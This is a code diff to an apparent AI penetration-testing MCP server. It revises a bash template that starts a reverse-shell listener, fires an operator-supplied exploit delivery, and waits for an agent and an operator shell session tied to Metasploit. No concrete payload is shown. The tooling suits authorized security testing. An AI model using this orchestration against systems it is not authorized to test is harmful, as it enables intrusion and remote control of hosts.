@@ -103,28 +103,33 @@ _EXPLOIT_SH_TEMPLATE = r"""#!/usr/bin/env bash
 #   AGENT_ONLY=1 bash <this script>                   # skip operator leg
 #
 # What it does:
-#   1. Start a fresh shell-server listener for the AGENT callback (LPORT / LABEL)
-#   2. Fire the delivery body below — INCLUDING every prerequisite step (auth,
-#      CSRF, cookie flow, intermediate requests). ${{LHOST}} / ${{LPORT}} /
-#      ${{LABEL}} are substituted at runtime. If a step is cleaner in Python,
-#      the delivery can call a helper at ${{EXPLOITS_DIR}}/python/<name>.py.
-#   3. Poll list_sessions until the agent callback lands.
-#   4. UNLESS AGENT_ONLY=1 is set, start a SECOND listener for the OPERATOR
-#      callback (OPERATOR_LPORT=LPORT+1, OPERATOR_LABEL=<label>-operator by
-#      default) and re-fire the delivery body with those overrides.
+#   1. Start a fresh shell-server listener on LPORT with LABEL. The listener
+#      stays up to catch MULTIPLE callbacks (shell-server listener's accept
+#      loop can take more than one connection).
+#   2. Fire the delivery body — INCLUDING every prerequisite step (auth, CSRF,
+#      cookies, intermediate requests). ${{LHOST}} / ${{LPORT}} / ${{LABEL}} are
+#      substituted at runtime.
+#   3. Poll list_sessions until the AGENT callback (first session on this
+#      listener) lands.
+#   4. UNLESS AGENT_ONLY=1 is set, re-fire the SAME delivery body on the SAME
+#      LPORT — the already-running listener accepts the second callback and
+#      produces a new session. The second session is labeled with the
+#      '-operator' suffix (via LABEL swap) so shell-mgr auto-reserves it and
+#      the metasploit-server dual-session guard recognises the pair.
 #   5. Poll list_sessions until the operator callback lands.
 #
 # NOTE: each new session's send_command is still gated on record_exploit —
 # call it again on each new session_id to unlock it. On the Metasploit side,
 # the operator session must also be reserve_operator_session'd (shell-mgr
-# does this automatically when the label ends in '-operator').
+# auto-reserves labels ending in '-operator'). ONE handler/listener per host
+# — no OPERATOR_LPORT=LPORT+1 doubling anymore; preflight handlers cover
+# both legs this way too.
 
 set -euo pipefail
 
 LHOST="${{LHOST:-{default_lhost}}}"
 LPORT="${{LPORT:-{default_lport}}}"
 LABEL="${{LABEL:-{label_env}}}"
-OPERATOR_LPORT="${{OPERATOR_LPORT:-$((LPORT + 1))}}"
 OPERATOR_LABEL="${{OPERATOR_LABEL:-${{LABEL}}-operator}}"
 AGENT_ONLY="${{AGENT_ONLY:-}}"
 
@@ -135,8 +140,9 @@ MCP_CALL="$REPO_ROOT/tools/shell-server/mcp-call.sh"
 export LHOST LPORT LABEL REPO_ROOT EXPLOITS_DIR
 
 # Delivery body is a function so we can call it once per leg (agent, operator)
-# with different LPORT/LABEL env. Body is operator-supplied; ${{LHOST}} /
-# ${{LPORT}} / ${{LABEL}} are the callback endpoint it should reference.
+# with LABEL swapped. Body is operator-supplied; ${{LHOST}} / ${{LPORT}} /
+# ${{LABEL}} are the callback endpoint it should reference. LPORT is the SAME
+# for both legs — only LABEL changes.
 fire_delivery() {{
     # ─── delivery body (operator-supplied, {label}) ───────────────────────
     {delivery_block}
@@ -160,7 +166,7 @@ wait_for_session() {{
 }}
 
 # ── Agent leg ────────────────────────────────────────────────────────────
-echo "[*] Starting AGENT listener on ${{LPORT}} (label=${{LABEL}})…"
+echo "[*] Starting listener on ${{LPORT}} (label=${{LABEL}}, catches both legs)…"
 "$MCP_CALL" start_listener "$(printf '{{"port": %s, "label": "%s"}}' "$LPORT" "$LABEL")" >/dev/null
 echo "[*] Firing delivery for AGENT callback (full chain: auth → prerequisites → trigger)…"
 export LHOST LPORT LABEL
@@ -184,12 +190,9 @@ if [ -n "$AGENT_ONLY" ]; then
     exit 0
 fi
 
-# ── Operator leg ─────────────────────────────────────────────────────────
-echo "[*] Starting OPERATOR listener on ${{OPERATOR_LPORT}} (label=${{OPERATOR_LABEL}})…"
-"$MCP_CALL" start_listener "$(printf '{{"port": %s, "label": "%s"}}' "$OPERATOR_LPORT" "$OPERATOR_LABEL")" >/dev/null
-echo "[*] Firing delivery for OPERATOR callback…"
+# ── Operator leg: SAME LPORT, LABEL swapped only ─────────────────────────
+echo "[*] Firing delivery AGAIN for OPERATOR callback on the SAME listener (${{LPORT}})…"
 (
-    LPORT="$OPERATOR_LPORT"
     LABEL="$OPERATOR_LABEL"
     export LHOST LPORT LABEL
     fire_delivery
@@ -202,8 +205,8 @@ if ! wait_for_session "$OPERATOR_LABEL"; then
     echo "    metasploit-server.reserve_operator_session on it."
     exit 3
 fi
-echo "    Operator session landed. Call reserve_operator_session on its MSF side"
-echo "    (shell-mgr auto-reserves labels ending in '-operator')."
+echo "    Operator session landed on same LPORT. Call reserve_operator_session"
+echo "    on its MSF side (shell-mgr auto-reserves labels ending in '-operator')."
 exit 0
 """
 
@@ -641,20 +644,19 @@ def create_server() -> FastMCP:
           1. `<ip>-[<hostname>-]<label>.sh` — an executable re-trigger script. On a
              later shell-drop, run it (`bash engagement/exploits/<...>.sh`)
              and it:
-               (a) starts a fresh shell-server listener via the MCP on the
-                   agent port + label,
+               (a) starts ONE shell-server listener on LPORT with LABEL,
                (b) fires the delivery body IN FULL — including every
                    prerequisite step (login, CSRF, cookie flow, intermediate
                    requests): the body MUST be end-to-end self-sufficient,
                    not a one-liner that assumes external auth state,
                (c) polls list_sessions until the AGENT callback lands,
-               (d) starts a SECOND listener (OPERATOR_LPORT=LPORT+1,
-                   OPERATOR_LABEL=<label>-operator) and re-fires the delivery
-                   with those overrides to produce the OPERATOR callback —
-                   satisfying PEN-AGENT's dual-session invariant (one agent
-                   + one operator per host). Set AGENT_ONLY=1 to skip the
-                   operator leg when the host truly can't support a second
-                   session.
+               (d) RE-FIRES the SAME delivery body on the SAME LPORT with
+                   LABEL swapped to `<label>-operator`; the listener accepts
+                   the second callback and shell-mgr auto-reserves it (labels
+                   ending in `-operator`) — satisfying the dual-session
+                   invariant without a second listener or `LPORT+1`. Set
+                   `AGENT_ONLY=1` to skip the operator leg when the host
+                   truly can't support a second callback.
              `${LHOST}` / `${LPORT}` / `${LABEL}` inside the delivery are
              bash-substituted at runtime; `${EXPLOITS_DIR}` points at the
              exploits dir so the delivery can `python3 "${EXPLOITS_DIR}"/
